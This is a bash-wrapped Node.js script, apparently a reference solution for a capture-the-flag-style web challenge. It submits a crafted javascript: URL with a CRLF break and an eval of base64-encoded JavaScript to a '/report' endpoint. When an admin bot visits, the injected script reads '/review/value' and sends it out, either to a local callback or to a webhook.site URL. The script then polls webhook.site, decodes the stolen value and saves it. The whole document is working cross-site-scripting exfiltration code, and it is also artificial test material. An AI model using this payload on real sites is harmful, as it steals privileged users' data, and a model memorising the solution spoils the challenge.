#!/usr/bin/env bash
set -euo pipefail

node <<'NODE'
const fs = require('node:fs');
const http = require('node:http');
const https = require('node:https');
const crypto = require('node:crypto');

const callbackBase = process.env.HSS_WEBHOOK_URL || '';
const collectionNonce = [...Array(24)].map(() => Math.floor(Math.random() * 16).toString(16)).join('');

function form(fields) {
  return new URLSearchParams(fields).toString();
}

function request(method, path, { body = '' } = {}) {
  return new Promise((resolve, reject) => {
    const headers = {};
    if (body) {
      headers['content-type'] = 'application/x-www-form-urlencoded';
      headers['content-length'] = Buffer.byteLength(body);
    }
    const req = http.request({ hostname: '127.0.0.1', port: 1337, path, method, headers }, (res) => {
      let data = '';
      res.setEncoding('utf8');
      res.on('data', (chunk) => { data += chunk; });
      res.on('end', () => resolve({ status: res.statusCode, body: data }));
    });
    req.on('error', reject);
    req.end(body);
  });
}

function externalRequest(url) {
  return new Promise((resolve, reject) => {
    const client = url.startsWith('https:') ? https : http;
    const req = client.get(url, (res) => {
      let data = '';
      res.setEncoding('utf8');
      res.on('data', (chunk) => { data += chunk; });
      res.on('end', () => resolve({ status: res.statusCode, body: data }));
    });
    req.on('error', reject);
  });
}

async function waitForService() {
  const deadline = Date.now() + 15000;
  while (Date.now() < deadline) {
    try {
      const res = await request('GET', '/');
      if (res.status === 200) return;
    } catch {}
    await new Promise((resolve) => setTimeout(resolve, 250));
  }
  throw new Error('service did not become ready');
}

function startCallback() {
  const callbackPath = `/cb-${crypto.randomBytes(18).toString('hex')}`;
  return new Promise((resolve, reject) => {
    const server = http.createServer((req, res) => {
      if (req.method !== 'POST' || req.url !== callbackPath) {
        res.statusCode = 404;
        res.end('not found');
        return;
      }
      let body = '';
      req.setEncoding('utf8');
      req.on('data', (chunk) => { body += chunk; });
      req.on('end', () => {
        res.end('ok');
        server.emit('captured', body.trim());
      });
    });
    server.on('error', reject);
    server.listen(0, '127.0.0.1', () => {
      const port = server.address().port;
      const received = new Promise((resolveReceived, rejectReceived) => {
        const timeout = setTimeout(() => {
          server.close();
          rejectReceived(new Error('timed out waiting for local callback'));
        }, 30000);
        server.once('captured', (value) => {
          clearTimeout(timeout);
          server.close();
          resolveReceived(value);
        });
      });
      resolve({ port, path: callbackPath, received });
    });
  });
}

async function main() {
  await waitForService();

  const localCallback = callbackBase ? null : await startCallback();
  const js = localCallback
    ? `fetch('/review/value').then(r=>r.text()).then(t=>fetch('http://127.0.0.1:${localCallback.port}${localCallback.path}',{method:'POST',mode:'no-cors',headers:{'Content-Type':'text/plain'},body:t}))`
    : `fetch('/review/value').then(r=>r.text()).then(t=>location=${JSON.stringify(callbackBase)}+'/?'+btoa(${JSON.stringify(collectionNonce)}+':'+t))`;
  const encoded = Buffer.from(js).toString('base64');
  const payload = `javascript://admin.pk/;%0D%0A;eval(atob('${encoded}'))\",\"username\":\"admin\",\"pass\":\"P@ss`;

  await request('POST', '/report', {
    body: form({ parameters: payload }),
  });

  if (localCallback) {
    const found = await localCallback.received;
    if (typeof found === 'string' && found.startsWith('HSS-')) {
      fs.writeFileSync('/app/output/recovered_value.txt', `${found}\n`, { mode: 0o600 });
      return;
    }
    throw new Error('local callback did not receive recovered value');
  }

  const deadline = Date.now() + 20000;
  while (Date.now() < deadline) {
    await new Promise((resolve) => setTimeout(resolve, 1000));
    const tokenMatch = callbackBase.match(/webhook\.site\/(?:#!\/)?(?:token\/)?([0-9a-f-]{36})/i);
    if (!tokenMatch) {
      throw new Error('set HSS_WEBHOOK_URL to a webhook.site URL');
    }
    const api = `https://webhook.site/token/${tokenMatch[1]}/requests?sorting=newest`;
    const res = await externalRequest(api);
    const data = JSON.parse(res.body);
    const requests = data.data || [];
    for (const item of requests) {
      const rawUrl = item.url || '';
      const encodedValue = rawUrl.includes('?') ? rawUrl.split('?').pop() : '';
      const decoded = Buffer.from(encodedValue, 'base64').toString('utf8');
      const [nonce, ...rest] = decoded.split(':');
      const found = nonce === collectionNonce ? rest.join(':') : '';
      if (found.startsWith('HSS-')) {
        fs.writeFileSync('/app/output/recovered_value.txt', `${found}\n`, { mode: 0o600 });
      return;
      }
    }
  }
  throw new Error('timed out waiting for collected value');
}

main().catch((error) => {
  console.error(error);
  process.exit(1);
});
NODE
